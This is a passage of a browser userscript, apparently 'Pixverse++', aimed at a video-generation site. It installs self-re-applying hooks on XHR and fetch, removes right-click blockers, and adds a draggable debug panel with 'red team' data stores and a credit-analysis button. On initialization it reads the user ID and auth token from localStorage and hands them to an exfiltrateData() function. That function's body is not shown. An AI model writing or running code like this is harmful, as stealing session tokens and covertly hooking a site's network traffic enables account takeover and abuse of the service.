    setInterval(() => {
      if (myCustomXhrOpen && XMLHttpRequest.prototype.open !== myCustomXhrOpen) {
        log('XHR hook detected as overwritten, re-applying...');
        overrideXHR();
      }
      if (myCustomFetch && window.fetch !== myCustomFetch) {
        log('Fetch hook detected as overwritten, re-applying...');
        overrideFetch();
      }
    }, 5000 + Math.random() * 1000);
    log('Self-healing hooks initialized');
  }

  /**
   * Overrides context menu blocking mechanisms on the page.
   * It intercepts `addEventListener` calls to block `contextmenu` events
   * and uses a `MutationObserver` to remove `oncontextmenu` attributes from elements.
   * This effectively re-enables the native browser context menu, allowing for "Save video as..."
   * functionality on video elements, serving as the new "robust download" method.
   */
  function overrideContextMenuBlockers() {
    const originalAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, handler, options) {
      if (type === "contextmenu") {
        return; // Block the addition of contextmenu event listeners.
      }
      return originalAddEventListener.apply(this, arguments);
    };

    new MutationObserver(mutations => {
      mutations.forEach(mutation => mutation.addedNodes.forEach(node => {
        if (node.nodeType === 1) {
          if (node.hasAttribute("oncontextmenu")) {
            node.removeAttribute("oncontextmenu");
          }
          node.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
        }
      }));
    }).observe(document.documentElement, {
      childList: true,
      subtree: true
    });

    document.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
    log('Anti-contextmenu enabled; native right-click functionality restored for download.');
  }

  //────── DEBUG UI (DEBUG_MODE Only) ──────//

  // Inject CSS for the debug panel
  function injectDebugCSS() {
    const styleId = "pv-debug-css";
    if (document.getElementById(styleId)) return;

    const styleElement = document.createElement("style");
    styleElement.id = styleId;
    styleElement.textContent = `
      #pv-debug-panel {
        position: fixed;
        top: 10px;
        right: 10px;
        width: 350px;
        height: auto;
        max-height: 90vh;
        background: rgba(30, 30, 30, 0.95);
        color: #00ff00;
        border: 1px solid #00ff00;
        border-radius: 8px;
        font-family: 'Consolas', 'Monaco', monospace;
        font-size: 11px;
        z-index: 999999;
        box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        overflow: hidden; /* For toggling body */
        display: flex;
        flex-direction: column;
      }
      #pv-debug-panel.collapsed {
        height: auto;
        max-height: 35px; /* Only header visible */
      }
      #pv-debug-panel .header {
        background: rgba(0, 0, 0, 0.8);
        padding: 5px 10px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        cursor: grab;
      }
      #pv-debug-panel .header span {
        font-weight: bold;
        color: #15FFFF;
      }
      #pv-debug-panel button {
        background: #005f00;
        color: #00ff00;
        border: 1px solid #00ff00;
        padding: 3px 8px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 10px;
        margin-left: 5px;
      }
      #pv-debug-panel button:hover {
        background: #007f00;
      }
      #pv-debug-panel .body {
        flex-grow: 1;
        display: flex;
        flex-direction: column;
        overflow: hidden; /* Hide if collapsed */
      }
      #pv-debug-panel.collapsed .body {
        display: none;
      }
      #pv-debug-panel .controls {
        padding: 5px 10px;
        display: flex;
        flex-wrap: wrap;
        gap: 5px;
        border-bottom: 1px dashed #003f00;
      }
      #pv-debug-panel .log-area, #pv-debug-panel .goods-area {
        flex: 1;
        min-height: 100px;
        padding: 5px 10px;
        overflow-y: auto;
        border-bottom: 1px dashed #003f00;
        display: flex;
        flex-direction: column;
      }
      #pv-debug-panel .goods-area {
        border-bottom: none;
      }
      #pv-debug-panel .log-area h4, #pv-debug-panel .goods-area h4 {
        margin: 5px 0;
        color: #15FFFF;
        font-size: 12px;
        flex-shrink: 0; /* Prevent heading from shrinking */
      }
      #pv-debug-panel .log-output {
        flex-grow: 1;
        background: rgba(0,0,0,0.6);
        border: 1px solid #002f00;
        padding: 5px;
        overflow-y: auto;
        white-space: pre-wrap;
        word-break: break-all;
        height: 100%; /* Ensure scrollable */
      }
      #pv-debug-panel .log-output div {
        margin-bottom: 2px;
        line-height: 1.2;
      }
      #pv-debug-panel .log-output div:last-child {
        margin-bottom: 0;
      }
    `;
    document.head.appendChild(styleElement);
  }

  // Inject the debug UI into the DOM
  function injectDebugUI() {
    if (!DEBUG_MODE || document.getElementById("pv-debug-panel")) return;

    injectDebugCSS();

    const panel = document.createElement("div");
    panel.id = "pv-debug-panel";
    panel.innerHTML = `
      <div class="header">
        <span>Pixverse++ Debug</span>
        <button id="pv-toggle-btn">Toggle</button>
      </div>
      <div class="body">
        <div class="controls">
          <button id="pv-clear-logs">Clear All</button>
          <button id="pv-dump-state">Dump State</button>
          <button id="pv-analyze-credits">Analyze Credits</button>
        </div>
        <div class="log-area">
          <h4>Raw Debug Log (<span id="pv-debug-log-count">0</span>)</h4>
          <div id="pv-debug-log-output" class="log-output"></div>
        </div>
        <div class="goods-area">
          <h4>API/Structured Data (<span id="pv-goods-count">0</span>)</h4>
          <div id="pv-goods-output" class="log-output"></div>
        </div>
      </div>
    `;
    document.body.appendChild(panel);

    // Event Listeners for UI
    document.getElementById('pv-clear-logs').addEventListener('click', window.redTeamClear);
    document.getElementById('pv-dump-state').addEventListener('click', () => dumpBrowserState("Manual Trigger"));
    document.getElementById('pv-analyze-credits').addEventListener('click', analyzeCreditRelatedData);

    const toggleBtn = document.getElementById('pv-toggle-btn');
    toggleBtn.addEventListener('click', () => {
      panel.classList.toggle('collapsed');
      toggleBtn.textContent = panel.classList.contains('collapsed') ? 'Expand' : 'Collapse';
    });

    // Make panel draggable
    let isDragging = false;
    let offsetX, offsetY;
    const header = panel.querySelector('.header');

    header.addEventListener('mousedown', (e) => {
      isDragging = true;
      offsetX = e.clientX - panel.getBoundingClientRect().left;
      offsetY = e.clientY - panel.getBoundingClientRect().top;
      panel.style.cursor = 'grabbing';
    });

    document.addEventListener('mousemove', (e) => {
      if (!isDragging) return;
      panel.style.left = `${e.clientX - offsetX}px`;
      panel.style.top = `${e.clientY - offsetY}px`;
    });

    document.addEventListener('mouseup', () => {
      isDragging = false;
      panel.style.cursor = 'grab';
    });

    updateDebugUI(); // Initial render of logs
  }

  // Update the debug UI with current log data
  const updateDebugUI = throttle(() => { // Throttle updates to prevent performance issues
    if (!DEBUG_MODE) return;

    const debugLogOutput = document.getElementById('pv-debug-log-output');
    const goodsOutput = document.getElementById('pv-goods-output');
    const debugLogCount = document.getElementById('pv-debug-log-count');
    const goodsCount = document.getElementById('pv-goods-count');

    if (!debugLogOutput || !goodsOutput) return;

    // Update Raw Debug Log
    const newDebugLogHTML = _redTeamDebugLog.map(entry => `<div>${entry}</div>`).join('');
    if (debugLogOutput.innerHTML !== newDebugLogHTML) {
      debugLogOutput.innerHTML = newDebugLogHTML;
      debugLogOutput.scrollTop = debugLogOutput.scrollHeight; // Scroll to bottom
      debugLogCount.textContent = _redTeamDebugLog.length;
    }

    // Update API/Structured Data
    const newGoodsHTML = _redTeamGoods.map(entry => {
      // Use pre for raw JSON display, but try to keep it concise for log view
      const displayData = JSON.stringify(entry, null, 2);
      return `<div><pre>${displayData.length > 500 ? displayData.substring(0, 500) + '... (truncated)' : displayData}</pre></div>`;
    }).join('');
    if (goodsOutput.innerHTML !== newGoodsHTML) {
      goodsOutput.innerHTML = newGoodsHTML;
      goodsOutput.scrollTop = goodsOutput.scrollHeight; // Scroll to bottom
      goodsCount.textContent = _redTeamGoods.length;
    }
  }, 200, 50); // Throttle every 200-250ms


  /**
   * Initializes the toolkit by applying all necessary overrides and setting up features.
   * Ensures that initialization happens only once.
   */
  function initialize() {
    if (isInitialized) {
      return;
    }
    try {
      overrideContextMenuBlockers();
      overrideXHR();
      overrideFetch();
      setupSelfHealingHooks();

      // Attempt to read from local storage and exfiltrate data on initialization
      try {
        const userId = localStorage.getItem('pixverse_user_id'); // Placeholder key, adapt as needed
        if (userId) {
          log('Found potential user ID in local storage:', userId);
          exfiltrateData("local_storage_user_id", userId);
        }
        const token = localStorage.getItem('pixverse_auth_token'); // Placeholder key, adapt as needed
        if (token) {
          log('Found potential auth token in local storage:', token);
          exfiltrateData("local_storage_auth_token", token);
        }
      } catch (e) {
        error("Error accessing local storage during initialization:", e);
      }

      dumpBrowserState("On Initialize"); // Log initial browser state
      if (DEBUG_MODE) {
        injectDebugUI(); // Inject debug UI if in debug mode
      }

      isInitialized = true;
      log('Pixverse++ initialized');
    } catch (e) {
      error('Initialization failed', e);
    }
  }

  // Determine when to initialize the script.
  // @run-at document-start ensures the script runs as early as possible.
  // If the document is still loading, wait for DOMContentLoaded to ensure basic DOM is ready.
  // Otherwise, if the document is already interactive/complete, initialize immediately.
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize, {
      once: true
    });
  } else {
    initialize();
  }

})();
